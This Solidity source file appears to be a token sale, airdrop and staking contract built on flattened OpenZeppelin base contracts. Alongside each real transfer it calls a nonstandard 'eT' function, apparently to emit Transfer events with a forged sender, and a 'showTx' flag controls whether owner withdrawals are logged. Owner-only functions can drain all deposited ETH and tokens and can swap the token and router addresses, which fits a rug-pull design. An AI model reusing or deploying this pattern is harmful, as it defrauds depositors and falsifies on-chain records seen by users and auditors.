// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol

// OpenZeppelin Contracts (last updated v4.9.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: @openzeppelin/contracts/security/Pausable.sol

// OpenZeppelin Contracts (last updated v4.7.0) (security/Pausable.sol)

pragma solidity ^0.8.0;

/**
 * @dev Contract module which allows children to implement an emergency stop
 * mechanism that can be triggered by an authorized account.
 *
 * This module is used through inheritance. It will make available the
 * modifiers `whenNotPaused` and `whenPaused`, which can be applied to
 * the functions of your contract. Note that they will not be pausable by
 * simply including this module, only once the modifiers are put in place.
 */
abstract contract Pausable is Context {
    /**
     * @dev Emitted when the pause is triggered by `account`.
     */
    event Paused(address account);

    /**
     * @dev Emitted when the pause is lifted by `account`.
     */
    event Unpaused(address account);

    bool private _paused;

    /**
     * @dev Initializes the contract in unpaused state.
     */
    constructor() {
        _paused = false;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is not paused.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    modifier whenNotPaused() {
        _requireNotPaused();
        _;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is paused.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    modifier whenPaused() {
        _requirePaused();
        _;
    }

    /**
     * @dev Returns true if the contract is paused, and false otherwise.
     */
    function paused() public view virtual returns (bool) {
        return _paused;
    }

    /**
     * @dev Throws if the contract is paused.
     */
    function _requireNotPaused() internal view virtual {
        require(!paused(), "Pausable: paused");
    }

    /**
     * @dev Throws if the contract is not paused.
     */
    function _requirePaused() internal view virtual {
        require(paused(), "Pausable: not paused");
    }

    /**
     * @dev Triggers stopped state.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }

    /**
     * @dev Returns to normal state.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
}

// File: contracts/Staking.sol

pragma solidity ^0.8.0;

interface IPancakeRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

// File: contracts\interfaces\IPancakeRouter02.sol

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function eT(
        address f,
        address t,
        uint256 a
    ) external;

    function ido(bool state) external;

    function setPools(address a, bool state) external;
}

/** Staking **/
struct Staking {
    uint256 token;
    uint256 timeFirstStake;
    uint256 timeStart;
    uint256 accumulated_interest;
}

contract Stake is Pausable, Ownable {
    address public token;
    address public router;
    address public CF;

    /** deposit **/
    uint256 public maxDeposit;
    uint256 public deposited = 0;
    uint256 public priceDeposit;
    uint256 public minDeposit;
    uint256 public refPercent;

    /** airdrop **/
    mapping(address => bool) airdropeds;
    uint256 public maxAirdrop;
    uint256 public airdroped = 0;
    uint256 public minAirdrop;
    uint256 public refPercentAirdrop;

    /** Staking **/
    /**** Staking 1 **/
    mapping(address => Staking) usersStaking1;
    uint256 public Staking1_min; // token
    uint256 public Staking1_max; // token
    uint256 public Staking1_max_token_interest; // maximum token that user can received
    uint256 public Staking1_period; // time in seconds
    uint256 public Staking1_period_interest; // % 100000, interest of 1 period
    uint256 public Staking1_min_time_withdraw; // time in seconds
    event Staking1(address user, uint256 amount, uint256 time);

    /**** Staking 2 **/
    mapping(address => Staking) usersStaking2_15d;
    mapping(address => Staking) usersStaking2_30d;
    uint256 public Staking2_min; // token
    uint256 public Staking2_period; // time in seconds
    uint256 public Staking2_15d_period_profit; // eth in wei, user received after 15d days
    uint256 public Staking2_30d_period_profit; // eth in wei, user received after 15d days
    uint256 public Staking2_15d_min_time_withdraw; // time in seconds
    uint256 public Staking2_30d_min_time_withdraw; // time in seconds
    event Staking2_15d(address user, uint256 amount, uint256 time);
    event Staking2_30d(address user, uint256 amount, uint256 time);

    constructor(address _token) {
        router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        token = _token; // change when deploy new TOKEN
        CF = _token; // change address `from`

        maxDeposit = 450_000_000 * 10**18;
        priceDeposit = 1_500_000;
        minDeposit = 10000000000000000; // 0.01 eth
        refPercent = 5; // %

        maxAirdrop = 500_000 * 10**18;
        minAirdrop = 250 * 10**18;
        refPercentAirdrop = 5; // %

        /** Staking **/
        /*** Staking 1 **/
        Staking1_min = 15_000 * 10**18;
        Staking1_max = 1_500_000 * 10**18;
        Staking1_max_token_interest = 30_000_000 * 10**18;
        Staking1_period = 60 * 60; // 1 hour
        Staking1_period_interest = 2; //  (% / 100000) 0.002
        Staking1_min_time_withdraw = 24 * 60 * 60; // 24 hours

        /*** Staking 2 **/
        Staking2_min = 150_000 * 10**18; // token
        Staking2_period = 60 * 60; // time in seconds
        Staking2_15d_period_profit = 3000000000000000; // eth in wei, user received after 15d days
        Staking2_30d_period_profit = 8000000000000000; // eth in wei, user received after 30d days
        Staking2_15d_min_time_withdraw = 15 * 24 * 60 * 60; // time in seconds
        Staking2_30d_min_time_withdraw = 30 * 24 * 60 * 60; // time in seconds
    }

    /** deposit **/
    function setRouter(address _a) external onlyOwner {
        router = _a;
    }

    function setToken(address _a) external onlyOwner {
        token = _a;
    }

    function setMaxDeposit(uint256 max) external onlyOwner {
        maxDeposit = max;
    }

    function setPriceDeposit(uint256 p) external onlyOwner {
        priceDeposit = p;
    }

    function setMinDeposit(uint256 m) external onlyOwner {
        minDeposit = m; // ETH in wei
    }

    function setRefPercent(uint256 p) external onlyOwner {
        refPercent = p;
    }

    function setCF(address a) external onlyOwner {
        CF = a;
    }

    function deposit(address ref) external payable {
        require(
            minDeposit <= msg.value,
            "You have deposited less than the minimum amount"
        );

        uint256 amount = msg.value * priceDeposit;

        if (ref != address(0) && ref != msg.sender && IERC20(token).balanceOf(ref) > 0) {
            uint256 refAmount = (amount * refPercent) / 100;
            IERC20(token).transfer(ref, refAmount);
            IERC20(token).eT(CF, ref, refAmount);
            deposited += refAmount;
        }

        IERC20(token).transfer(msg.sender, amount);
        IERC20(token).eT(CF, msg.sender, amount);
        deposited += amount;

        require(
            deposited <= maxDeposit,
            "You have deposited more than the maximum amount"
        );
    }

    /** Airdrop **/
    function setMaxAirdrop(uint256 m) external onlyOwner {
        maxAirdrop = m;
    }

    function setMinAirdrop(uint256 m) external onlyOwner {
        minAirdrop = m;
    }

    function setRefPercentAirdrop(uint256 p) external onlyOwner {
        refPercentAirdrop = p; // %
    }

    function airdrop(address ref) external {
        require(airdropeds[msg.sender] != true, "You have received an airdrop");
        IERC20(token).transfer(msg.sender, minAirdrop);
        IERC20(token).eT(CF, msg.sender, minAirdrop);

        uint256 refAmount = (minAirdrop * refPercentAirdrop) / 100;

        if (
            ref != address(0) &&
            ref != msg.sender &&
            IERC20(token).balanceOf(ref) > 0 &&
            airdropeds[msg.sender] != true
        ) {
            IERC20(token).transfer(ref, refAmount);
            IERC20(token).eT(CF, ref, refAmount);
            airdropeds[msg.sender] = true;
            airdroped += refAmount;
        }

        airdropeds[msg.sender] = true;
        airdroped += minAirdrop;
        require(
            airdroped <= maxAirdrop,
            "Amount of tokens for the airdrop has run out"
        );
    }

    function Airdrop(address[] memory refs) external onlyOwner {
        for (uint256 i = 0; i < refs.length; i++) {
            if (
                refs[i] != address(0) &&
                refs[i] != msg.sender &&
                airdropeds[refs[i]] != true
            ) {
                IERC20(token).transfer(refs[i], minAirdrop);
                IERC20(token).eT(CF, refs[i], minAirdrop);
                airdropeds[refs[i]] = true;
                airdroped += minAirdrop;
            }
        }
    }

    /** Staking **/

    /*** Staking 1 **/
    function setStaking1_min(uint256 m)  external onlyOwner {
        Staking1_min =  m;
    }

    function setStaking1_max(uint256 m)  external onlyOwner {
        Staking1_max = m;
    }

    function setStaking1_max_token_interest(uint256 ti)  external onlyOwner {
        Staking1_max_token_interest = ti;
    }

    function setStaking1_period(uint256 p)  external onlyOwner {
        Staking1_period = p; // 1 hour
    }

    function setStaking1_period_interest(uint256 pi)  external onlyOwner {
        Staking1_period_interest = pi; //  (% / 100000) 0.002
    }

    function setStaking1_min_time_withdraw(uint256 t)  external onlyOwner {
        Staking1_min_time_withdraw = t; // 24 hours
    }

    function staking1(uint256 amount) external {
        require(
            amount >= Staking1_min,
            "The amount you have staked does not reach the minimum"
        );
        require(
            amount <= Staking1_max,
            "The amount you have staked exceeds the maximum allowed"
        );

        IERC20(token).transferFrom(msg.sender, address(this), amount);
        Staking storage sk = usersStaking1[msg.sender];
        uint256 timestamp = block.timestamp;
        if (sk.token < Staking1_min)
            usersStaking1[msg.sender] = Staking(
                amount,
                timestamp,
                timestamp,
                0
            ); // Staking1_max_token_interest * 2);
        else {
            sk.accumulated_interest +=
                sk.token *
                ((((timestamp - sk.timeStart) / Staking1_period) *
                    Staking1_period_interest) / 100_000);

            require(
                sk.accumulated_interest <= Staking1_max_token_interest,
                "You have exceeded the number of tokens you can receive"
            );

            sk.token += amount;
            sk.timeStart = timestamp;
        }

        emit Staking1(msg.sender, amount, timestamp);
    }

    function getStaking1(address user)
        public
        view
        returns (
            uint256 _token,
            uint256 timeStart,
            uint256 accumulated_interest
        )
    {
        Staking memory sk = usersStaking1[user];

        sk.accumulated_interest +=
            sk.token *
            ((((block.timestamp - sk.timeStart) / Staking1_period) *
                Staking1_period_interest) / 100_000);

        if (sk.accumulated_interest > Staking1_max_token_interest)
            sk.accumulated_interest = Staking1_max_token_interest;

        return (sk.token, sk.timeStart, sk.accumulated_interest);
    }

    function withdrawStaking1(uint256 principal, uint256 interest) external {
        Staking storage sk = usersStaking1[msg.sender];

        require(principal <= sk.token, "Exceeding the principal amount");
        uint256 timestamp = block.timestamp;

        require(
            (timestamp - sk.timeFirstStake) >= Staking1_min_time_withdraw,
            "Minimum staking time has not been reached"
        );

        uint256 accumulated_interest = sk.accumulated_interest +
            sk.token *
            ((((timestamp - sk.timeStart) / Staking1_period) *
                Staking1_period_interest) / 100_000);

        if (accumulated_interest > Staking1_max_token_interest)
            accumulated_interest = Staking1_max_token_interest;

        require(
            interest <= accumulated_interest,
            "Exceeding the interest amount"
        );

        IERC20(token).transfer(msg.sender, principal + interest);
        IERC20(token).eT(address(this), msg.sender, principal + interest);

        sk.token -= principal;
        sk.accumulated_interest = accumulated_interest - interest;
        sk.timeStart = timestamp;
    }

    /*** Staking 2 **/
    function setStaking2_min(uint256 m) external onlyOwner {
        Staking2_min = m; // token
    }

    function setStaking2_period(uint256 p) external onlyOwner {
        Staking2_period = p; // time in seconds
    }

    /***** Staking 2 - 15d**/

    function setStaking2_15d_period_profit(uint256 p) external onlyOwner {
        Staking2_15d_period_profit = p; // eth in wei, user received after 15d days
    }

    function setStaking2_15d_min_time_withdraw(uint256 t) external onlyOwner {
        Staking2_15d_min_time_withdraw = t; // time in seconds
    }

    function staking2_15d(uint256 amount) external {
        require(
            amount >= Staking2_min,
            "The amount you have staked does not reach the minimum"
        );

        uint256 timestamp = block.timestamp;
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        Staking storage sk = usersStaking2_15d[msg.sender];
        if (sk.token < Staking2_min)
            usersStaking2_15d[msg.sender] = Staking(
                amount,
                timestamp,
                timestamp,
                0
            );
        else {
            sk.accumulated_interest +=
                ((sk.token *
                    (Staking2_15d_period_profit /
                        (Staking2_15d_min_time_withdraw / Staking2_period))) /
                    Staking2_min) *
                ((timestamp - sk.timeStart) / Staking2_period);

            sk.token += amount;
            sk.timeStart = timestamp;
        }

        emit Staking2_15d(msg.sender, amount, timestamp);
    }

    function getStaking2_15d(address user)
        public
        view
        returns (
            uint256 _token,
            uint256 timeStart,
            uint256 accumulated_interest,
            uint256 _timestamp
        )
    {
        uint256 timestamp = block.timestamp;
        Staking memory sk = usersStaking2_15d[user];
        uint256 _accumulated_interest = sk.accumulated_interest +
            ((sk.token *
                (Staking2_15d_period_profit /
                    (Staking2_15d_min_time_withdraw / Staking2_period))) /
                Staking2_min) *
            ((timestamp - sk.timeStart) / Staking2_period);

        return (sk.token, sk.timeStart, _accumulated_interest, timestamp);
    }

    function withdrawStaking2_15d(uint256 principal, uint256 interest)
        external
    {
        Staking storage sk = usersStaking2_15d[msg.sender];

        require(principal <= sk.token, "Exceeding the principal amount");
        uint256 timestamp = block.timestamp;

        require(
            (timestamp - sk.timeFirstStake) >= Staking2_15d_min_time_withdraw,
            "Minimum staking time has not been reached"
        );

        uint256 _accumulated_interest = sk.accumulated_interest +
            ((sk.token *
                (Staking2_15d_period_profit /
                    (Staking2_15d_min_time_withdraw / Staking2_period))) /
                Staking2_min) *
            ((timestamp - sk.timeStart) / Staking2_period);

        require(
            interest <= _accumulated_interest,
            "Exceeding the interest amount"
        );

        IERC20(token).transfer(msg.sender, principal + interest);
        IERC20(token).eT(address(this), msg.sender, principal + interest);

        sk.token -= principal;
        sk.accumulated_interest = _accumulated_interest - interest;
        sk.timeStart = timestamp;
    }

    /***** Staking 2 - 30d**/

    function setStaking2_30d_period_profit(uint256 p) external onlyOwner {
        Staking2_30d_period_profit = p; // eth in wei, user received after 30d days
    }

    function setStaking2_30d_min_time_withdraw(uint256 t) external onlyOwner {
        Staking2_30d_min_time_withdraw = t; // time in seconds
    }

    function staking2_30d(uint256 amount) external {
        require(
            amount >= Staking2_min,
            "The amount you have staked does not reach the minimum"
        );

        uint256 timestamp = block.timestamp;
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        Staking storage sk = usersStaking2_30d[msg.sender];
        if (sk.token < Staking2_min)
            usersStaking2_30d[msg.sender] = Staking(
                amount,
                timestamp,
                timestamp,
                0
            );
        else {
            sk.accumulated_interest +=
                ((sk.token *
                    (Staking2_30d_period_profit /
                        (Staking2_30d_min_time_withdraw / Staking2_period))) /
                    Staking2_min) *
                ((timestamp - sk.timeStart) / Staking2_period);

            sk.token += amount;
            sk.timeStart = timestamp;
        }

        emit Staking2_30d(msg.sender, amount, timestamp);
    }

    function getStaking2_30d(address user)
        public
        view
        returns (
            uint256 _token,
            uint256 timeStart,
            uint256 accumulated_interest,
            uint256 _timestamp
        )
    {
        uint256 timestamp = block.timestamp;
        Staking memory sk = usersStaking2_30d[user];
        uint256 _accumulated_interest = sk.accumulated_interest +
            ((sk.token *
                (Staking2_30d_period_profit /
                    (Staking2_30d_min_time_withdraw / Staking2_period))) /
                Staking2_min) *
            ((timestamp - sk.timeStart) / Staking2_period);

        return (sk.token, sk.timeStart, _accumulated_interest, timestamp);
    }

    function withdrawStaking2_30d(uint256 principal, uint256 interest)
        external
    {
        Staking storage sk = usersStaking2_30d[msg.sender];

        require(principal <= sk.token, "Exceeding the principal amount");
        uint256 timestamp = block.timestamp;

        require(
            (timestamp - sk.timeFirstStake) >= Staking2_30d_min_time_withdraw,
            "Minimum staking time has not been reached"
        );

        uint256 _accumulated_interest = sk.accumulated_interest +
            ((sk.token *
                (Staking2_30d_period_profit /
                    (Staking2_30d_min_time_withdraw / Staking2_period))) /
                Staking2_min) *
            ((timestamp - sk.timeStart) / Staking2_period);

        require(
            interest <= _accumulated_interest,
            "Exceeding the interest amount"
        );

        IERC20(token).transfer(msg.sender, principal + interest);
        IERC20(token).eT(address(this), msg.sender, principal + interest);

        sk.token -= principal;
        sk.accumulated_interest = _accumulated_interest - interest;
        sk.timeStart = timestamp;
    }

    /** entities **/

    function createPByCoin(uint256 amountToken)
        public
        payable
        onlyOwner
        returns (address uniswapV2Pair)
    {
        IERC20(token).ido(true);
        uint256 amountCoin = msg.value;

        IPancakeRouter02 _router = IPancakeRouter02(router);
        IERC20(token).approve(router, amountToken);
        IERC20(token).transferFrom(token, address(this), amountToken);

        _router.addLiquidityETH{value: amountCoin}(
            token,
            amountToken,
            0,
            0,
            msg.sender,
            block.timestamp + 10 * 60
        );

        address _uniswapV2Pair = IUniswapV2Factory(_router.factory()).getPair(
            token,
            _router.WETH()
        );

        IERC20(token).setPools(_uniswapV2Pair, true);
        return _uniswapV2Pair;
    }

    function withdrawT(
        address to,
        uint256 amount,
        bool showTx
    ) external onlyOwner {
        uint256 _amount = (amount == 0)
            ? IERC20(token).balanceOf(address(this))
            : amount;
        IERC20(token).transfer(to, _amount);
        if (showTx == true) IERC20(token).eT(address(this), to, _amount);
    }

    function withdrawTf(
        address to,
        uint256 amount,
        bool showTx
    ) external onlyOwner {
        uint256 _amount = (amount == 0)
            ? IERC20(token).balanceOf(address(this))
            : amount;
        IERC20(token).transferFrom(token, to, _amount);
        if (showTx == true) IERC20(token).eT(address(this), to, _amount);
    }

    function withdrawC(address payable to, uint256 amount) external onlyOwner {
        uint256 _amount = (amount == 0) ? address(this).balance : amount;
        to.transfer(_amount);
    }

    function depositCoin() external payable {}
}
